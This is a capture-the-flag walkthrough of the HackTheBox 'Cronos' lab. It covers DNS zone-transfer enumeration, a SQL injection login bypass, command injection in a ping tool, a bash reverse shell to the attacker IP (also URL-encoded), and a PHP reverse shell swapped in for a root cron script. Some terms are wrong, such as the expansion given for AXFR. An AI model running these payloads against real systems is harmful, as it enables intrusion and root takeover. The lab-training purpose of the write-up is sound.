# Cronos

Cronos is a medium difficulty lab on the HackTheBox platform released on 22nd March, 2017 and retired on May 26th, 2017.  It can be found at [Cronos](https://app.hackthebox.com/machines/Cronos).  The goal of the lab is to retrieve the user.txt and proof.txt flags located in a user's home directory and the root home directory respectively.  

For the purposes of this report, the lab's IP address is 10.129.227.211 and our IP address is 10.10.15.125.  

## Enumeration

With the lab started, we can run NMAP against the target machine  

> nmap -A -p- -v --max-scan-delay 5ms -oN cronos.nmap 10.129.227.211

```
Nmap 7.98 scan initiated Thu May 28 09:30:40 2026 as: /usr/lib/nmap/nmap -A -p- -v --max-scan-delay 5ms -oN cronos.nmap 10.129.227.211
Nmap scan report for 10.129.227.211
Host is up (0.042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Uptime guess: 0.003 days (since Thu May 28 09:27:02 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   33.26 ms 10.10.14.1
2   35.25 ms 10.129.227.211

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Thu May 28 09:31:53 2026 -- 1 IP address (1 host up) scanned in 72.50 seconds`
```

The NMAP scan reveals 3 ports open and the potential services available on each port -- An SSH server on port 22, a DNS server on port 53, and a web server on port 80.  Testing the webserver first shows the Apache2 default page.  

[Apache2](images/Apache2.png)

Since there is a DNS server on port 53, we can query it for the domain name of the host.

> host 10.129.227.211 10.129.227.211

```
Using domain server:
Name: 10.129.227.211
Address: 10.129.227.211#53
Aliases:

211.227.129.10.in-addr.arpa domain name pointer ns1.cronos.htb.
```

This reveals that the domain name is cronos.htb, so we can update /etc/hosts with the following line:

> 10.129.227.211 cronos.htb

And navigate to http\://cronos.htb, where we find a relatively blank page and a few links that go to laravel.com, laracasts.com, laravel-news.com, and github.  These links are out of scope, so we don't engage with them.

[CronosPage](images/CronosPage.png)

Running dirsearch to directory fuzz cronos.htb reveals a few seemingly interesting directories, but no further useful information is found within the files.

> dirsearch -u http\://cronos.htb/

```
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Target: http://cronos.htb/

Starting:                                                                                                
301 -  305B  - /js  ->  http://cronos.htb/js/                    
403 -  296B  - /.ht_wsr.txt                                      
403 -  301B  - /.htaccess.sample                                 
403 -  299B  - /.htaccess.orig
403 -  299B  - /.htaccess.save
403 -  298B  - /.htaccessOLD2                                    
403 -  299B  - /.htaccess_orig
403 -  299B  - /.htaccess.bak1
403 -  300B  - /.htaccess_extra                                  
403 -  297B  - /.htaccess_sc                                     
403 -  297B  - /.htaccessOLD
403 -  297B  - /.htaccessBAK                                     
403 -  289B  - /.htm
403 -  290B  - /.html
403 -  299B  - /.htpasswd_test                                   
403 -  295B  - /.htpasswds
403 -  296B  - /.httr-oauth                                      
403 -  289B  - /.php                                             
403 -  290B  - /.php3                                            
301 -  306B  - /css  ->  http://cronos.htb/css/                  
200 -    0B  - /favicon.ico                                      
404 -   11KB - /index.php/login/                                 
200 -  449B  - /js/                                              
200 -   24B  - /robots.txt                                       
403 -  298B  - /server-status                                    
403 -  299B  - /server-status/                                   
200 -  914B  - /web.config
```

Since there is a domain server open, we can attempt an AXFR (Asynchronous Full Transfer Zone) request to replicate the zone database to see if there's any interesting subdirectories.

> host -l cronos.htb 10.129.227.211

```
Using domain server:
Name: 10.129.227.211
Address: 10.129.227.211#53
Aliases:

cronos.htb name server ns1.cronos.htb
cronos.htb has address 10.10.10.13
admin.cronos.htb has address 10.10.10.13
ns1.cronos.htb has address 10.10.10.13
www.cronos.htb has address 10.10.10.13
```

In doing so, we find the admin.cronos.htb subdirectory.  Navigating to the admin.cronos.htb subdirectory reveals a login page with little else.

[AdminLogin](images/AdminLogin.png)

## Initial Access

Attempting a few weak usernames and passwords (admin/admin, admin/password, etc.) on the login form fails.  However, attempting a basic SQL injection for bypassing login forms in the user field (admin' #) works and grants us access to a welcome.php page with a net tool intended to perform traceroutes and pings using system tools.

[NetTool](images/NetTool.png)

Testing if we can break out of the net tool's logic using a semicolon (traceroute 8.8.8.8; whoami) in order to run a second command results in successful execution of arbitrary commands.

[Whoami](images/Whoami.png)

Opening the request up in BurpSuite shows the two parameters (command and host) that we are sending.  Below is an example where we are sending '8.8.8.8; cat /etc/passwd'

[Request](images/Request.png)

Sending commands with certain characters results in the web server not being able to understand the command.  However, if we URL encode our commands, it will be understood by the web server.

We can send the request to BurpSuite's repeater before obtaining a reverse shell for Linux from revshells.com (/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.125/4444 0>&1") and running it through BurpSuite's URL encoder results in the following string which can be appended to the request (The %20 between the semicolon and the rest of the command has been replaced with +):

``%3b+%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%35%2e%31%32%35%2f%34%34%34%34%20%30%3e%26%31``

Before we can send this string as part of the host parameter, we start a netcat listener on our machine.

> nc -lnvp 4444

```
listening on [any] 4444 ...
```

Then we send the request with BurpSuite's repeater.

[Repeater](images/Repeater.png)

And on our netcat listener, we obtain a reverse shell as www-data.

```
connect to [10.10.15.125] from (UNKNOWN) [10.129.227.211] 60490
bash: cannot set terminal process group (1359): inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ 
```

The user.txt flag can be retrieved from the home directory of the user 'noulis' with the following command

> cat /home/noulis/user.txt

## Privilege Escalation

Running cat /etc/crontab reveals an interesting job running as root every minute:

> cat /etc/crontab

```
...
* * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
...
```

Checking the file privileges for the binary reveals we are able to read, write and execute as www-data.

> ls -al /var/www/laravel/artisan

``-rwxr-xr-x 1 www-data www-data 1646 Apr 9 2016 /var/www/laravel/artisan``

Checking the filetype, we find it is a php script.

> file /var/www/laravel/artisan

``artisan: a /usr/bin/env php script, ASCII text executable``

By replacing this file with a malicious php script, we can obtain a reverse shell as the root user.  In order to do so, we create the malicious php script obtained from revshells:

> cat shell.php

```
#! /usr/bin/env php
<?php
    $sock=fsockopen("10.10.15.125",5555);
    exec("/bin/bash <&3 >&3 2>&3");
?>
```

And start a python webserver on our attacking machine

> python3 -m http.server 80

``Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...``

On the victim machine while in the /var/www/laravel directory, we rename the current artisan file to 'oldartisan'

> mv artisan oldartisan

Then we download the malicious php file to the /var/www/laravel

> curl http\://10.10.15.125/shell.php -o artisan

And open a netcat listener for port 5555.  Within 1-2 minutes, we should receive a reverse shell as the root user.

> nc -lnvp 5555

```
listening on [any] 5555 ...
connect to [10.10.15.125] from (UNKNOWN) [10.129.227.221] 41904
```

> whoami

``root``

The root.txt flag can be found with the following command:

> cat /root/root.txt

## Credit

Kali Linux (https://www.kali.org/)  
Hack The Box (https://www.hackthebox.com/)  
NMAP (https://nmap.org/)  
Dirsearch (https://github.com/maurosoria/dirsearch)  
BurpSuite (https://portswigger.net/burp)  
Revshells (https://www.revshells.com/)  
